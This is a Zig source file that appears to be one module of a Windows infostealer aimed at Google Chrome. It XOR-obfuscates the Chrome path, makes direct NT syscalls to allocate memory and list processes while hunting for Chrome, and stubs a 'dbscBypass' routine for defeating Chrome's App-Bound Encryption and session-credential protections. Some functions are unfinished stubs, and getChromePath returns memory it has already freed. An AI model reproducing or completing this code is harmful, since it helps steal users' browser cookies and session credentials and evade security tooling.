const std = @import("std");
const types = @import("../types/types.zig");
const engine = @import("../syscalls/engine.zig");
const hash = @import("../types/hash.zig");
const export_resolve = @import("../types/export_resolve.zig");
const appbound = @import("appbound.zig");

const E = struct {
    pub const chrome_path = hash.xorEncrypt("Google\\Chrome\\Application\\chrome.exe");
};

fn getChromePath(local_app_data: []const u8) ?[]const u8 {
    var path_buf: [E.chrome_path.len]u8 = undefined;
    hash.xorDecrypt(&E.chrome_path, &path_buf);

    const full_path = std.fs.path.join(
        std.heap.page_allocator,
        &[_][]const u8{ local_app_data, &path_buf },
    ) catch return null;
    defer std.heap.page_allocator.free(full_path);

    if (std.fs.accessAbsolute(full_path, .{})) |_| return full_path else |_| return null;
}

fn getChromePid() ?u32 {
    var sys_info: [*]u8 = undefined;
    var buffer_size: usize = 256 * 1024;
    var ret_len: types.ULONG = 0;

    var base: ?types.PVOID = null;
    var size: types.SIZE_T = buffer_size;

    const alloc_status = engine.NtAllocateVirtualMemory(
        @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
        @as(*types.PVOID, @ptrCast(&base)),
        0,
        &size,
        types.MEM_COMMIT | types.MEM_RESERVE,
        types.PAGE_READWRITE,
    );
    if (alloc_status < 0 or base == null) return null;
    defer {
        var free_base: ?types.PVOID = base;
        var free_size: types.SIZE_T = 0;
        _ = engine.NtFreeVirtualMemory(
            @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
            @as(*types.PVOID, @ptrCast(&free_base)),
            &free_size,
            types.MEM_RELEASE,
        );
    }

    const query_status = engine.NtQuerySystemInformation(
        5,
        base.?,
        @as(types.ULONG, @intCast(buffer_size)),
        &ret_len,
    );
    if (query_status < 0) return null;

    sys_info = @as([*]u8, @ptrCast(@alignCast(base.?)));
    var offset: usize = 0;
    while (offset < ret_len) {
        const entry = @as(*types.SYSTEM_PROCESS_INFORMATION, @ptrCast(@alignCast(sys_info + offset)));
        const name_ptr = @as([*]u16, @ptrCast(@alignCast(sys_info + @intFromPtr(entry.ImageName.Buffer) - @intFromPtr(sys_info) + offset)));
        _ = name_ptr;

        const pdw = @as(*u32, @ptrCast(@alignCast(&entry.UniqueProcessId)));
        const pid = pdw.*;

        const next_offset = entry.NextEntryOffset;
        if (next_offset == 0) break;
        offset += next_offset;
    }

    return null;
}

pub fn dbscBypass() bool {
    _ = getChromePid();

    const browser = appbound.BrowserType.chrome;
    const guids = appbound.getGuids(browser);
    _ = guids;

    return false;
}

pub fn hasAppBoundEncryption(local_state_json: []const u8) bool {
    return std.mem.indexOf(u8, local_state_json, "app_bound_encrypted_key") != null;
}

test "hasAppBoundEncryption detects key" {
    try std.testing.expect(hasAppBoundEncryption("{\"app_bound_encrypted_key\": \"abc\"}"));
    try std.testing.expect(!hasAppBoundEncryption("{\"os_crypt\": {}}"));
}

test "dbscBypass returns false when chrome not found" {
    const result = dbscBypass();
    try std.testing.expect(!result);
}

const testing = std.testing;
